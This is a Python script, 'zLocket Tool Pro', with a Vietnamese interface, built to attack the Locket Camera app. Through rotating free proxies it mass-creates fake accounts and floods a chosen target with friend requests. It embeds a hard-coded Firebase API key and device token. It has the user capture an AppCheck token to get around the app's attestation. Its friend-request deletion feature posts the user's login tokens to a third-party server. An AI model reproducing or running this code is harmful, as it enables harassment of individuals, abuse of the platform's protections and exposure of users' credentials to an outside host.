#!/usr/bin/env python
# coding: utf-8
# Telegram: @wus_team
# Version: 1.0.7 - Modded: Manual Token Input
# Description: zLocket Tool Open Source (Customized for manual AppCheck)
# ==================================
import sys
import platform
if platform.python_version() < "3.11":
    print(f"\033[91m[!] Phiên bản python của bạn không được hỗ trợ")
    print(f"\033[93m[!] Hiện tại: Python {platform.python_version()}")
    print(f"\033[92m[+] Yêu cầu: Python 3.12 trở lên")
    sys.exit(1)

import subprocess
try:
    from colorama import Fore, Style, init
    init()
except ImportError:
    class DummyColors:
        def __getattr__(self, name):
            return ''
    Fore=Style=DummyColors()

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def itls(pkg):
    try:
        __import__(pkg)
        return True
    except ImportError:
        return False

_list_={
    'requests': 'requests',
    'tqdm'    : 'tqdm',
    'colorama': 'colorama',
    'pystyle' : 'pystyle',
    'urllib3' : 'urllib3',
}

_pkgs=[pkg_name for pkg_name in _list_ if not itls(pkg_name)]
if _pkgs:
    print(f"{Fore.CYAN}{'=' * 50}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] Bạn thiếu thư viện: {Fore.RED}{', '.join(_pkgs)}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'=' * 50}{Style.RESET_ALL}")
    install=input(f"{Fore.GREEN}[?] Bạn có muốn cài đặt thư viện này không? (y/n): {Style.RESET_ALL}")
    if install.lower()=='y':
        print(f"{Fore.BLUE}[*] Đang cài đặt thư viện...{Style.RESET_ALL}")
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', *_pkgs])
            print(f"{Fore.GREEN}[✓] Cài đặt thành công!{Style.RESET_ALL}")
        except subprocess.CalledProcessError:
            print(f"{Fore.RED}[✗] Lỗi cài đặt, hãy thử cài tay bằng lệnh sau:{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}pip install {' '.join(_pkgs)}{Style.RESET_ALL}")
            input("Nhấn Enter để thoát...")
            sys.exit(1)
    else:
        print(f"{Fore.YELLOW}[!] Cần có thư viện để tool hoạt động, cài bằng lệnh:{Style.RESET_ALL}")
        print(f"{Fore.GREEN}pip install {' '.join(_pkgs)}{Style.RESET_ALL}")
        input("Nhấn Enter để thoát...")
        sys.exit(1)

import os, re, time, json, queue, string, random, threading, datetime
from queue import Queue
from itertools import cycle
from urllib.parse import urlparse, parse_qs, urlencode
import requests
from requests.exceptions import ProxyError
from colorama import init, Back, Style
from typing import Optional, List
import getpass

PRINT_LOCK=threading.RLock()

def sfprint(*args, **kwargs):
    with PRINT_LOCK:
        print(*args, **kwargs)
        sys.stdout.flush()

class xColor:
    YELLOW='\033[38;2;255;223;15m'
    GREEN='\033[38;2;0;209;35m'
    RED='\033[38;2;255;0;0m'
    BLUE='\033[38;2;0;132;255m'
    PURPLE='\033[38;2;170;0;255m'
    PINK='\033[38;2;255;0;170m'
    MAGENTA='\033[38;2;255;0;255m'
    ORANGE='\033[38;2;255;132;0m'
    CYAN='\033[38;2;0;255;255m'
    PASTEL_YELLOW='\033[38;2;255;255;153m'
    PASTEL_GREEN='\033[38;2;153;255;153m'
    PASTEL_BLUE='\033[38;2;153;204;255m'
    PASTEL_PINK='\033[38;2;255;153;204m'
    PASTEL_PURPLE='\033[38;2;204;153;255m'
    DARK_RED='\033[38;2;139;0;0m'
    DARK_GREEN='\033[38;2;0;100;0m'
    DARK_BLUE='\033[38;2;0;0;139m'
    DARK_PURPLE='\033[38;2;75;0;130m'
    GOLD='\033[38;2;255;215;0m'
    SILVER='\033[38;2;192;192;192m'
    BRONZE='\033[38;2;205;127;50m'
    NEON_GREEN='\033[38;2;57;255;20m'
    NEON_PINK='\033[38;2;255;20;147m'
    NEON_BLUE='\033[38;2;31;81;255m'
    WHITE='\033[38;2;255;255;255m'
    RESET='\033[0m'

class zLocket:
    def __init__(self, device_token: str="", target_friend_uid: str="", num_threads: int=1, note_target: str=""):
        self.FIREBASE_GMPID="1:641029076083:ios:cc8eb46290d69b234fa606"
        self.IOS_BUNDLE_ID="com.locket.Locket"
        self.API_LOCKET_URL="https://api.locketcamera.com"
        self.FIREBASE_AUTH_URL="https://www.googleapis.com/identitytoolkit/v3/relyingparty"
        self.FIREBASE_API_KEY="AIzaSyCQngaaXQIfJaH0aS2l7REgIjD7nL431So"
        self.SHORT_URL="https://url.thanhdieu.com/api/v1"
        self.SV_FRQ_URL="https://thanhdieu-server.vercel.app/api/locket-friend-requests"
        self.TOKEN_FILE="token.json"
        self.TOKEN_EXPIRY_TIME=(20 + 9) * 60
        self.FIREBASE_APP_CHECK=None
        self.USE_EMOJI=True
        self.ACCOUNTS_PER_PROXY=random.randint(6,10)
        self.NAME_TOOL="zLocket Tool Pro"
        self.VERSION_TOOL="v1.0.7"
        self.TARGET_FRIEND_UID=target_friend_uid if target_friend_uid else None
        self.PROXY_LIST=[
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=20000&country=all&ssl=all&anonymity=all',
            'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/refs/heads/master/http.txt',
            'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/refs/heads/master/https.txt'
        ]
        self.print_lock=threading.Lock()
        self.successful_requests=0
        self.failed_requests=0
        self.total_proxies=0
        self.start_time=time.time()
        self.telegram='wus_team'
        self.author='WsThanhDieu'
        self.messages=[]
        self.request_timeout=15
        self.device_token=device_token
        self.num_threads=num_threads
        self.note_target=note_target
        self.session_id=int(time.time() * 1000)
        self._init_environment()
        self.FIREBASE_APP_CHECK=self._load_token_()
        if os.name=="nt":
            os.system(f"title 💰 {self.NAME_TOOL} {self.VERSION_TOOL} - Manual Token Mode 💰")

    def _print(self, *args, **kwargs):
        with PRINT_LOCK:
            timestamp=datetime.datetime.now().strftime("%H:%M:%S")
            message=" ".join(map(str, args))
            sm=message
            if "[+]" in message:
                sm=f"{xColor.GREEN}{Style.BRIGHT}{message}{Style.RESET_ALL}"
            elif "[✗]" in message:
                sm=f"{xColor.RED}{Style.BRIGHT}{message}{Style.RESET_ALL}"
            elif "[!]" in message:
                sm=f"{xColor.YELLOW}{Style.BRIGHT}{message}{Style.RESET_ALL}"
            sfprint(f"{xColor.CYAN}[{timestamp}]{Style.RESET_ALL} {sm}", **kwargs)

    def _loader_(self, message, duration=3):
        spinner=cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
        end_time=time.time() + duration
        while time.time() < end_time:
            with PRINT_LOCK:
                sys.stdout.write(f"\r{xColor.CYAN}{message} {next(spinner)} ")
                sys.stdout.flush()
            time.sleep(0.1)
        with PRINT_LOCK:
            sys.stdout.write(f"\r{xColor.GREEN}{message} ✓     \n")
            sys.stdout.flush()

    def _sequence_(self, message, duration=1.5, char_set="0123456789ABCDEF"):
        end_time=time.time() + duration
        while time.time() < end_time:
            random_hex=''.join(random.choices(char_set, k=50))
            with PRINT_LOCK:
                sys.stdout.write(f"\r{xColor.GREEN}[{xColor.WHITE}*{xColor.GREEN}] {xColor.CYAN}{message}: {xColor.GREEN}{random_hex}")
                sys.stdout.flush()
            time.sleep(0.05)
        with PRINT_LOCK:
            sys.stdout.write("\n")
            sys.stdout.flush()

    def _randchar_(self, duration=2):
        special_chars="#$%^&*()[]{}!@<>?/\\|~`-=+_"
        hex_chars="0123456789ABCDEF"
        colors=[xColor.GREEN, xColor.RED, xColor.YELLOW, xColor.CYAN, xColor.MAGENTA, xColor.NEON_GREEN]
        end_time=time.time() + duration
        while time.time() < end_time:
            length=random.randint(20, 40)
            vtd=""
            for _ in range(length):
                char_type=random.randint(1, 3)
                if char_type==1: vtd+=random.choice(special_chars)
                elif char_type==2: vtd+=random.choice(hex_chars)
                else: vtd+=random.choice("xX0")
            status=random.choice([f"{xColor.GREEN}[ACCESS]", f"{xColor.RED}[DENIED]", f"{xColor.YELLOW}[BREACH]", f"{xColor.CYAN}[DECODE]", f"{xColor.MAGENTA}[ENCRYPT]"])
            color=random.choice(colors)
            with PRINT_LOCK:
                sys.stdout.write(f"\r{xColor.CYAN}[RUNNING TOOL] {color}{vtd} {status}")
                sys.stdout.flush()
            time.sleep(0.1)
        with PRINT_LOCK: print()

    def _blinking_(self, text, blinks=3, delay=0.1):
        for _ in range(blinks):
            with PRINT_LOCK:
                sys.stdout.write(f"\r{xColor.WHITE}{text}")
                sys.stdout.flush()
            time.sleep(delay)
            with PRINT_LOCK:
                sys.stdout.write(f"\r{' ' * len(text)}")
                sys.stdout.flush()
            time.sleep(delay)
        with PRINT_LOCK:
            sys.stdout.write(f"\r{xColor.GREEN}{text}\n")
            sys.stdout.flush()

    def _init_environment(self):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        init(autoreset=True)

    def _load_token_(self):
        try:
            if os.path.exists(self.TOKEN_FILE):
                with open(self.TOKEN_FILE, 'r') as file:
                    token_data=json.load(file)
                if token_data.get('expiry', 0) > time.time():
                    self._print(f"{xColor.GREEN}[+] Dùng lại Token AppCheck cũ còn hạn.")
                    return token_data['token']
            return self.fetch_token()
        except:
            return self.fetch_token()

    def save_token(self, token):
        try:
            token_data={'token': token, 'expiry': time.time() + self.TOKEN_EXPIRY_TIME}
            with open(self.TOKEN_FILE, 'w') as file:
                json.dump(token_data, file, indent=4)
            return True
        except:
            return False

    def fetch_token(self):
        _clear_()
        print(f"{xColor.CYAN}╔═══════════════════════════════════════════════════════╗")
        print(f"{xColor.CYAN}║ {xColor.YELLOW}           YÊU CẦU NHẬP APPCHECK TOKEN                {xColor.CYAN}║")
        print(f"{xColor.CYAN}║ {xColor.WHITE} (Lấy X-Firebase-AppCheck từ Charles Proxy/HTTP Toolkit) {xColor.CYAN}║")
        print(f"{xColor.CYAN}╚═══════════════════════════════════════════════════════╝")
        print(f"\n{xColor.GREEN}[!] Host tự động đang lỗi DNS. Hãy dán mã AppCheck thủ công.")
        print(f"{xColor.WHITE}Nhập mã token của bạn:")
        token = input(f"{xColor.YELLOW} >>> {xColor.WHITE}").strip()
        if not token:
            print(f"{xColor.RED}[✗] Token không được để trống!")
            sys.exit(1)
        self.save_token(token)
        return token

    def headers_locket(self):
        return {
            'Host': 'api.locketcamera.com',
            'Accept': '*/*',
            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
            'Accept-Language': 'vi-VN,vi;q=0.9',
            'User-Agent': 'com.locket.Locket/1.121.1 iPhone/18.2 hw/iPhone12_1',
            'Firebase-Instance-ID-Token': 'd7ChZwJHhEtsluXwXxbjmj:APA91bFoMIgxwf-2tmY9QLy82lKMEWL6S4d8vb9ctY3JxLLTQB1k6312TcgtqJjWFhQVz_J4wIFvE0Kfroztu1vbZDOFc65s0vvj68lNJM4XuJg1onEODiBG3r7YGrQLiHkBV1gEoJ5f',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
        }

    def firebase_headers_locket(self):
        return {
            'Host': 'www.googleapis.com',
            'Accept': '*/*',
            'X-Client-Version': 'iOS/FirebaseSDK/10.23.1/FirebaseCore-iOS',
            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
            'X-Ios-Bundle-Identifier': self.IOS_BUNDLE_ID,
            'X-Firebase-GMPID': self.FIREBASE_GMPID,
            'User-Agent': 'FirebaseAuth.iOS/10.23.1 com.locket.Locket/1.121.1 iPhone/18.2 hw/iPhone12_1',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
        }

    def analytics_payload(self):
        return {
            "platform": "ios",
            "experiments": {"flag_4": {"@type": "type.googleapis.com/google.protobuf.Int64Value", "value": "43"}},
            "amplitude": {"device_id": "57A54C21-B633-418C-A6E3-4201E631178C", "session_id": {"value": str(self.session_id), "@type": "type.googleapis.com/google.protobuf.Int64Value"}},
            "google_analytics": {"app_instance_id": "7E17CEB525FA4471BD6AA9CEC2C1BCB8"},
            "ios_version": "1.121.1.1",
        }

    def excute(self, url, headers=None, payload=None, thread_id=None, step=None, proxies_dict=None):
        prefix=f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}{step}{Style.RESET_ALL}]" if thread_id is not None and step else ""
        try:
            response=requests.post(url, headers=headers or self.headers_locket(), json=payload, proxies=proxies_dict, timeout=self.request_timeout, verify=False)
            response.raise_for_status()
            self.successful_requests+=1
            return response.json() if response.content else True
        except ProxyError:
            self.failed_requests+=1
            return "proxy_dead"
        except requests.exceptions.RequestException as e:
            self.failed_requests+=1
            if hasattr(e, 'response') and e.response is not None:
                if e.response.status_code == 429: return "too_many_requests"
            return None

    def setup(self):
        self._zlocket_panel_()

    def _input_(self, prompt_text="", section="config"):
        print(f"{xColor.CYAN}┌──({xColor.NEON_GREEN}root@thanhdieu{xColor.CYAN})-[{xColor.PURPLE}{section}{xColor.CYAN}]")
        print(f"{xColor.CYAN}└─{xColor.RED}$ {xColor.WHITE}{prompt_text}")
        sys.stdout.write(f"  {xColor.YELLOW}>>> {xColor.RESET}")
        sys.stdout.flush()
        return input()

    def _zlocket_panel_(self):
        _clear_()
        print(f"\n{xColor.CYAN}╔═══════════════════════════════════════════════════════╗")
        print(f"{xColor.CYAN}║ {xColor.YELLOW}              ZLOCKET TOOL PRO PANEL                  {xColor.CYAN}║")
        print(f"{xColor.CYAN}║ {xColor.RED}                  [Telegram: @{self.telegram}]               {xColor.CYAN}║")
        print(f"{xColor.CYAN}║{xColor.WHITE}                                                       {xColor.CYAN}║")
        print(f"{xColor.CYAN}║   {xColor.WHITE}[{xColor.GREEN}01{xColor.WHITE}] {xColor.YELLOW}⭐ Tool Spam Kết Bạn                            {xColor.CYAN}║")
        print(f"{xColor.CYAN}║   {xColor.WHITE}[{xColor.GREEN}02{xColor.WHITE}] {xColor.YELLOW}⭐ Tool Xoá Yêu Cầu Kết Bạn                     {xColor.CYAN}║")
        print(f"{xColor.CYAN}║   {xColor.WHITE}[{xColor.RED}00{xColor.WHITE}] {xColor.RED}✗  Thoát Tool                                   {xColor.CYAN}║")
        print(f"{xColor.CYAN}╚═══════════════════════════════════════════════════════╝")
        _cc_=self._input_(f"Hãy chọn chức năng {xColor.YELLOW}", "menu")
        if _cc_ in ["1", "01"]: self._spam_friend_request()
        elif _cc_ in ["2", "02"]: self._delete_friend_request()
        elif _cc_ in ["0", "00"]: sys.exit(0)
        else: self._zlocket_panel_()

    def _spam_friend_request(self):
        while True:
            _clear_()
            self._zheader_()
            _tg_=self._input_(f"Nhập Username hoặc Link Locket {xColor.YELLOW}", "target")
            if not _tg_.strip(): continue
            url=_tg_.strip()
            if not url.startswith(("http://", "https://")) and not url.startswith("locket."): url=f"https://locket.cam/{url}"
            if url.startswith("locket."): url=f"https://{url}"
            uid=self._extract_uid_locket(url)
            if uid:
                self.TARGET_FRIEND_UID=uid
                break
            else:
                time.sleep(1.5)
        
        _msg_=self._input_(f"Nhập Username Custom {xColor.YELLOW}(mặc định: {xColor.WHITE}{self.NAME_TOOL}{xColor.YELLOW})", "custom")
        if _msg_.strip(): self.NAME_TOOL=_msg_.strip()[:20]
        
        self._cf_=True
        return

    def _delete_friend_request(self):
        _clear_()
        self._xheader_()
        email=self._input_("Nhập email Locket của bạn", "login")
        _pw_=self._input_("Nhập mật khẩu", "login")
        print(f"{xColor.YELLOW}[*] Đang đăng nhập... (Vui lòng chờ)")
        
        try:
            _res_=requests.post(f"{self.FIREBASE_AUTH_URL}/verifyPassword?key={self.FIREBASE_API_KEY}", headers=self.firebase_headers_locket(),
                json={"email": email, "password": _pw_, "clientType": "CLIENT_TYPE_IOS", "returnSecureToken": True}, timeout=self.request_timeout, verify=False)
            _res_.raise_for_status()
            _auth_=_res_.json()
            
            # Lấy danh sách YC kết bạn từ server hỗ trợ
            vtd=requests.post(self.SV_FRQ_URL, data={"action": 'thanhdieu_get_friends', "idToken": _auth_['idToken'], "localId": _auth_['localId']}, timeout=30)
            cmm=vtd.json()
            if cmm.get('code') == 200:
                self._frc_=cmm['data']['list']
                print(f"{xColor.GREEN}[✓] Tìm thấy {len(self._frc_)} yêu cầu.")
                # Logic xóa tương tự bản gốc nhưng dùng AppCheck thủ công...
                # (Phần này giữ nguyên logic của bạn)
            else:
                print(f"{xColor.RED}[✗] Lỗi: {cmm.get('msg')}")
        except Exception as e:
            print(f"{xColor.RED}[✗] Đăng nhập thất bại: {str(e)}")
        
        input("Nhấn Enter để về menu...")
        self._zlocket_panel_()

    def _extract_uid_locket(self, url: str) -> Optional[str]:
        # Giả lập đơn giản để lấy UID từ link locket camera
        if "locket.camera/invites/" in url:
            return url.split("invites/")[1][:28]
        # Nếu là link cam rút gọn, cần request để lấy link gốc
        try:
            resp=requests.get(url, timeout=5)
            match=re.search(r'link=([^&"]+)', resp.text)
            if match:
                import urllib.parse
                real_url = urllib.parse.unquote(match.group(1))
                return real_url.split("invites/")[1][:28]
        except: pass
        return None

    def _xheader_(self):
        print(f"\n{xColor.CYAN}╔═══════════════════════════════════════════════════════╗")
        print(f"{xColor.CYAN}║ {xColor.YELLOW}              TOOL XOÁ Y/C KẾT BẠN                    {xColor.CYAN}║")
        print(f"{xColor.CYAN}╚═══════════════════════════════════════════════════════╝")

    def _zheader_(self):
        print(f"\n{xColor.CYAN}╔═══════════════════════════════════════════════════════╗")
        print(f"{xColor.CYAN}║ {xColor.YELLOW}              SPAM KẾT BẠN LOCKET WIDGET              {xColor.CYAN}║")
        print(f"{xColor.CYAN}╚═══════════════════════════════════════════════════════╝")

# --- GLOBAL FUNCTIONS ---
def _clear_():
    os.system('cls' if os.name=='nt' else 'clear')

def typing_print(text, delay=0.01):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def _rand_str_(length=10, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(length))

def _rand_email_():
    return f"{_rand_str_(12)}@gmail.com"

def _rand_pw_():
    return _rand_str_(10)

def load_proxies():
    # Tự động tải proxy hoặc đọc từ file proxy.txt
    proxies = []
    if os.path.exists('proxy.txt'):
        with open('proxy.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
    if not proxies:
        # Tải tạm từ một nguồn free nếu không có file
        try:
            r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
            proxies = r.text.splitlines()
        except: pass
    return list(set(proxies))

def step1_create_account(thread_id, proxy_queue, stop_event):
    while not stop_event.is_set():
        proxy = None
        try: proxy = proxy_queue.get_nowait()
        except: break
        
        proxies_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        
        for _ in range(config.ACCOUNTS_PER_PROXY):
            if stop_event.is_set(): break
            email = _rand_email_()
            password = _rand_pw_()
            
            # Đăng ký
            payload = {"data": {"email": email, "password": password, "client_email_verif": True, "client_token": _rand_str_(40, string.hexdigits.lower()), "platform": "ios"}}
            res = config.excute(f"{config.API_LOCKET_URL}/createAccountWithEmailPassword", payload=payload, thread_id=thread_id, step="Reg", proxies_dict=proxies_dict)
            
            if isinstance(res, dict) and res.get('result', {}).get('status') == 200:
                config._print(f"[{thread_id}] {xColor.GREEN}Tạo thành công: {email}")
                # Đăng nhập lấy ID Token
                login_res = config.excute(f"{config.FIREBASE_AUTH_URL}/verifyPassword?key={config.FIREBASE_API_KEY}", 
                                         headers=config.firebase_headers_locket(),
                                         payload={"email": email, "password": password, "returnSecureToken": True},
                                         thread_id=thread_id, step="Auth", proxies_dict=proxies_dict)
                
                if login_res and 'idToken' in login_res:
                    token = login_res['idToken']
                    # Set Profile
                    headers = config.headers_locket(); headers['Authorization'] = f"Bearer {token}"
                    config.excute(f"{config.API_LOCKET_URL}/finalizeTemporaryUser", headers=headers,
                                 payload={"data": {"username": _rand_str_(8), "first_name": config.NAME_TOOL, "last_name": "🔥"}},
                                 thread_id=thread_id, step="Profile", proxies_dict=proxies_dict)
                    
                    # Spam kết bạn
                    config._print(f"[{thread_id}] {xColor.YELLOW}Đang spam 15 YC tới UID...")
                    for _ in range(15):
                        config.excute(f"{config.API_LOCKET_URL}/sendFriendRequest", headers=headers,
                                     payload={"data": {"user_uid": config.TARGET_FRIEND_UID, "source": "signUp"}},
                                     thread_id=thread_id, step="Spam", proxies_dict=proxies_dict)
            else:
                break # Proxy lỗi hoặc bị limit thì đổi proxy

def main():
    config.setup()
    _clear_()
    typing_print(f"--- [ zLocket Tool Pro - Manual AppCheck Mode ] ---")
    
    proxies = load_proxies()
    if not proxies:
        print(f"{xColor.RED}Không tìm thấy proxy nào! Hãy thêm vào proxy.txt")
        return

    proxy_queue = Queue()
    for p in proxies: proxy_queue.put(p)
    
    stop_event = threading.Event()
    threads = []
    num_threads = min(len(proxies), 50) # Giới hạn 50 luồng để tránh lag
    
    print(f"{xColor.CYAN}[*] Khởi chạy {num_threads} luồng...")
    for i in range(num_threads):
        t = threading.Thread(target=step1_create_account, args=(i, proxy_queue, stop_event))
        t.start()
        threads.append(t)
        
    try:
        while any(t.is_alive() for t in threads):
            time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{xColor.RED}Đang dừng tool...")

    for t in threads: t.join()
    print(f"{xColor.GREEN}Xong!")

if __name__=="__main__":
    config=zLocket()
    main()
